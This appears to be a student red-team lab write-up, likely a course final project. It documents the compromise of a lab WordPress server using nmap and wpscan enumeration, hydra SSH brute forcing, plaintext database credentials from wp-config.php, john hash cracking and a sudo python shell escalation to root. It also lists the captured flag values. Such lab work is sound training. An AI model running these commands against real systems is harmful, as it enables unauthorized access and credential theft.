# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services


Nmap scan results for each machine reveal the below services and OS details:

```
bash
$ nmap -sV 192.168.1.0/24
  # Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-28 16:19 PDT
Nmap scan report for 192.168.1.1
Host is up (0.00069s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2179/tcp open  vmrdp?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
MAC Address: 00:15:5D:00:04:0D (Microsoft)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 192.168.1.100
Host is up (0.00076s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
9200/tcp open  http    Elasticsearch REST API 7.6.1 (name: elk; cluster: elasticsearch; Lucene 8.4.0)
MAC Address: 4C:EB:42:D2:D5:D7 (Intel Corporate)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.1.105
Host is up (0.00068s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29
MAC Address: 00:15:5D:00:04:0F (Microsoft)
Service Info: Host: 192.168.1.105; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.1.110
Host is up (0.00080s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind     2-4 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:15:5D:00:04:10 (Microsoft)
Service Info: Host: TARGET1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.1.115
Host is up (0.0017s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind     2-4 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:15:5D:00:04:11 (Microsoft)
Service Info: Host: TARGET2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 192.168.1.90
Host is up (0.0000080s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.1p1 Debian 5 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (6 hosts up) scanned in 28.83 seconds
```

This scan identifies the services below as potential points of entry:

- Target 1
  - 22/tcp ssh        
  - 80/tcp http

The following vulnerabilities were identified on each target:

- Target 1
  - Port 22 was opening allowing an attacker to SSH into the server.
  - Port 80 was open allowing unsecure connections to the web application.
  - The wordpress user 'michael' has a simple password.
  - The web server is vulnerable to brute force attacks.
  - The mySQL username and password is stored in plain text.
  - The user 'steven' requires no password to run commands in the python library. This allows for privilege escalation by generating a shell using python.

 - Scan Used
  - wpscan --url http://192.168.1.110/wordpress --enumerate

![](https://github.com/smalani06/cs-final-project/blob/main/images/wps1.png)
![](https://github.com/smalani06/cs-final-project/blob/main/images/wps2.png)

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:

- Target 1
  - `flag1.txt`: _b9bbcb33e11b80be759c4e844862482d_
    - **Exploit Used**
      - Use hydra to brute force the password for user 'michael'.
        - ```hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh```
      - SSH into the server using michael's account.
        - ```ssh michael@192.168.1.110```
      - Navigate to the website directory
        - ```cd /var/www/html/```
      - Use grep to find the flag in the html files.
        - ```grep -E flag*. *.html```

![](https://github.com/smalani06/cs-final-project/blob/main/images/hydra.png)
![](https://github.com/smalani06/cs-final-project/blob/main/images/flag1.png)

  - `flag2.txt`: _fc3fd58dcdad9ab23faca6e9a36e581c_
    - **Exploit Used**
      - SSH into the server using michael's account.
        - ```ssh michael@192.168.1.110```
      - Use find command to search for flags.
        - ```find . -name flag*```

![](https://github.com/smalani06/cs-final-project/blob/main/images/findflag2.png)

  - `flag3.txt`: _afc01ab56b50591e7dccf93122770cd2_
    - **Exploit Used**
      - Look for the mysql username and password in the wp-config.php files.
        - ```find . -name *wp-config*```
        - ```nano ./wordpress/wp-config.php```
      - Log in to the mysql database by using the password found above.
        - ```mysql -u root -p```
      - Look at the tables and search for flags in the wp_posts table.
        - ```USE wordpress;```
        - ```SHOW TABLES;```
        - ```select * from wp_posts where post_content like '%flag%';```

![](https://github.com/smalani06/cs-final-project/blob/main/images/wp-config.png)
![](https://github.com/smalani06/cs-final-project/blob/main/images/login.png)
![](https://github.com/smalani06/cs-final-project/blob/main/images/tables.png)
![](https://github.com/smalani06/cs-final-project/blob/main/images/flag3.png)

  - `flag4.txt`: _715dea6c055b9fe3337544932f2941ce_
    - **Exploit Used**
      - After logging into the mySQL database, we checked the table wp_users where the user's password hashes were stored.
        - ```SELECT * FROM wp_users;```
      - Used john the ripper to crack user steven's password.
        - ```john wp_hashes.txt```
      - Connected to the server via SSH using steven's password.
      - List the allowed (and forbidden) commands for the invoking user steven.
        - ```sudo -l```
      - Since NOPASSWD is set for /usr/bin/python/, we can use python to escalate our privilege to root.
        - ```sudo python -c 'import pty;pty.spawn("/bin/bash")'```
      - Use find to locate flag4.
        - ```find . -name flag*```
        - cat /root/flag4.txt

![](https://github.com/smalani06/cs-final-project/blob/main/images/john.png)
![](https://github.com/smalani06/cs-final-project/blob/main/images/sshsteven.png)
![](https://github.com/smalani06/cs-final-project/blob/main/images/findflag4.png)
![](https://github.com/smalani06/cs-final-project/blob/main/images/flag4.png)
